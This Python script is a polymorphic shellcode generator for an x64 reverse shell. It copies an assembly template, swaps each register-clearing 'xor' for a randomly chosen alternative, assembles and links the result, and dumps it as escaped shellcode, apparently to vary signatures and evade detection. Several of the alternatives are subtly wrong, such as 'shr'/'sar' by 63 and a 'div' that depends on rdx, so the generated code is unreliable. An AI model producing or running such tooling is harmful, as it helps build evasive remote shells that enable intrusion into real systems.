import random
import os

def main():
    # Create a new asm file based on a template of a reverse shell (x64)
    os.system("cp template.asm reverse.asm")
    
    file = 'reverse.asm'
    file_o = 'reverse.o'
    
    # Each loop will change the lines which contains each register with "xor" instruction
    registers = ['rax', 'rbx', 'rcx', 'rdx']
    for reg in registers:
        clear_register(reg, file)

    # Compile and link the asm file 
    os.system("nasm -f elf64 -o %s %s && ld -o reverse %s" % (file_o, file, file_o))

    # Using objdump and parsing it to have the shellcode format, it will be saved in a txt file
    commande = 'objdump -d reverse | grep "^ " | cut -f2 | awk \'{for(i=1;i<=NF;i++) printf "\\\\x%s",$i} END {print ""}\' > result.txt'
    os.system(commande)

    # Print size
    print("Shellcode length: %s" % (os.path.getsize('result.txt') // 4))

    # Print the shellcode
    print(os.system("cat result.txt"))

# Replace the basic xor method by a random one for each line clearing a register in the assembly file
def clear_register (register, file):
    placeholder = '  xor %s, %s' % (register, register)
    clearing_methods = ['  xor %s, %s' % (register, register),
                        '  shr %s, 63' % register,
                        '  sub %s, %s' % (register, register),
                        '  mov %s, 0xFFFFFFFFFFFFFFFF\n  add %s, 1' % (register, register),
                        '  sar %s, 63' % register,
                        '  clc\n  setc dl\n  movzx %s, dl' % register]
    if register == 'rax':
        clearing_methods.append('  mov %s, 0x1111111111111111\n  div %s\n  dec %s' % (register, register, register))
    new = clearing_methods
    edit(file, placeholder, new)


def edit(filename, deletedlines, newlines):
    try:
        with open(filename, 'r') as file:
            lines = file.readlines()

        # Search for the line that needs to be deleted
        deletedindex = [i for i, line in enumerate(lines) if line.strip() == deletedlines.strip()]

        # Edit all the lines that should replace the deleted instruction
        # Each lines will get a different instruction thanks to a randomizer
        for index in reversed(deletedindex):
            del lines[index]
            rand = random.randint(0, len(newlines)-1)
            lines.insert(index, newlines[rand] + '\n')

        # Writing in the file
        with open(filename, 'w') as file:
            file.writelines(lines)

        #print("Successfull edit.")
    except FileNotFoundError:
        print(f"'{filename}' not founded.")
    except Exception as e:
        print(f"An error occured: {e}")

if __name__ == '__main__':
    main()
